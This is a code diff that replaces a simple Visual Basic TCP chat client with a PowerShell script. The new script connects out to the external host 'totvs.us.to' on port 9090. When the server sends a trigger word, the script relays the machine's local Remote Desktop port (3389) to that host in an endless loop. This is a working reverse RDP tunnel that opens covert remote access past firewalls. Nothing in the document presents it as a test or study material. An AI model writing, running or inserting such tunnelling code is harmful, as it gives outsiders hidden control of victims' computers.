@@ -1,63 +1,40 @@
-Add-Type -Language VisualBasic -TypeDefinition @"
 
-Imports System
-Imports System.Net.Sockets
-Imports System.Text
+$ClientControl = New-Object System.Net.Sockets.TcpClient
+$ClientControl.Connect("totvs.us.to",9090)
+Write-Host "[+] Servidor Conectado"
+$ServerStream = $ClientControl.GetStream()
+$Buffers = New-Object byte[] 65536
+$MSGDatos = New-Object byte[] 65536
+$MSGData = New-Object byte[] 65536
 
-Public Class TunnelClient
+while($true)
+{
+    $MSGRead = $ServerStream.Read($Buffers,0,$Buffers.Length)
+    if($MSGRead -gt 0)
+    {
+        $MSGCommands =[System.Text.Encoding]::UTF8.GetString($Buffers,0,$MSGRead).Trim()
 
-    Public Shared Sub Start()
+        if($MSGCommands.Trim() -eq "Hola")
+        {
+       Write-Host "[+] Abriendo RDP Local"
 
-        Dim ServerIP As String = "192.168.10.254"
-        Dim ServerPort As Integer = 9090
+$RdpControl = New-Object System.Net.Sockets.TcpClient
+$RdpControl.Connect("127.0.0.4",3389)
+$RdpStream = $RdpControl.GetStream()
 
-        Dim client As New TcpClient()
-
-        client.Connect(ServerIP, ServerPort)
-
-        Console.WriteLine("[+] Conectado a " & ServerIP & ":" & ServerPort)
-
-        Dim stream As NetworkStream = client.GetStream()
-
-        Dim buffer(4096) As Byte
-
-        While True
-
-            Console.Write("> ")
-
-            Dim msg As String = Console.ReadLine()
-
-            If msg Is Nothing Then
-                Exit While
-            End If
-
-
-            Dim data() As Byte = Encoding.UTF8.GetBytes(msg)
-
-            stream.Write(data,0,data.Length)
-
-
-            Dim read As Integer = stream.Read(buffer,0,buffer.Length)
-
-            If read <= 0 Then
-                Exit While
-            End If
-
-
-            Dim response As String = Encoding.UTF8.GetString(buffer,0,read)
-
-            Console.WriteLine("Servidor: " & response)
-
-        End While
-
-
-        client.Close()
-
-    End Sub
-
-End Class
-
-"@
-
-
-[TunnelClient]::Start()
+while($true)
+            {
+                if($ServerStream.DataAvailable)
+                {
+                    $Rolst = $ServerStream.Read($MSGDatos,0,$MSGDatos.Length)
+                    $RdpStream.Write($MSGDatos,0,$Rolst)
+                }
+                if($RdpStream.DataAvailable)
+                {
+                    $Mastr = $RdpStream.Read($MSGData,0,$MSGData.Length)
+                    $ServerStream.Write($MSGData,0,$Mastr)
+                }
+            }
+        }
+    }
+}
